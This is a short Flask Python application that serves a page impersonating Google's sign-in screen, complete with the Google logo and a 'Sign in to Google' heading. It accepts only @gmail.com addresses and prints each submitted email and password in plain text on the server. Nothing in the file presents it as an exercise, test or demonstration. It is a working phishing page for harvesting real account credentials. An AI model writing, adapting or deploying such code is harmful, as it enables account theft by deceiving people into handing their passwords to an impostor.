from flask import Flask, request, redirect, url_for, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign In</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: Arial, sans-serif;
            }
            .container {
                border: 1px solid #ccc;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                text-align: center;
                max-width: 400px;
                width: 100%;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            button {
                padding: 10px 20px;
                margin: 10px;
                border: none;
                border-radius: 4px;
                background-color: #4CAF50;
                color: white;
                cursor: pointer;
            }
            button:hover {
                background-color: #45a049;
            }
            .error-message {
                color: red;
                display: none;
                margin-top: -10px;
                margin-bottom: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Google_2015_logo.svg/512px-Google_2015_logo.svg.png" alt="Google Logo" style="width: 150px; height: auto;">
            <h2>Sign in to Google</h2>
            <form id="sign-in-form" action="/submit" method="post" onsubmit="return validateEmail()">
                <input type="text" id="email" name="email" placeholder="Email" required>
                <div id="email-error" class="error-message">Please enter a valid Gmail address ending with @gmail.com</div>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign In</button>
            </form>
            <div>
                <button type="button" onclick="window.location.href='https://www.google.com'">Learn more</button>
                <button type="button" onclick="window.location.href='https://accounts.google.com/SignUp'">Create account</button>
            </div>
        </div>
        <script>
            function validateEmail() {
                const emailField = document.getElementById('email');
                const emailError = document.getElementById('email-error');
                const emailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
                if (!emailPattern.test(emailField.value)) {
                    emailError.style.display = 'block';
                    return false;
                }
                emailError.style.display = 'none';
                return true;
            }
        </script>
    </body>
    </html>
    ''')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    if email.endswith('@gmail.com'):
        print(f'Submitted Email: {email}, Submitted Password: {password}')
    else:
        print('Invalid email. Please use a @gmail.com email address.')
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
